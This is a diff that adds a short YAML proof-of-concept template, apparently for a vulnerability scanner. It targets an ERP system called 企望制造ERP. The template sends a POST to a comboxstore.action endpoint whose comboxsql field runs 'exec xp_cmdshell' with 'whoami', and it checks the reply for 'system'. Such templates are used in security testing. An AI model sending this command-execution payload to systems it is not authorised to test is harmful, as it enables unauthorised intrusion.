@@ -1,0 +1,15 @@
+name: poc-yaml-企望制造ERP系统-runcmd
+description: >-
+  代码执行
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /mainFunctions/comboxstore.action
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >
+      comboxsql=exec%20xp_cmdshell%20'whoami'
+    expression:
+      status: 200
+      body_all: ["system"]
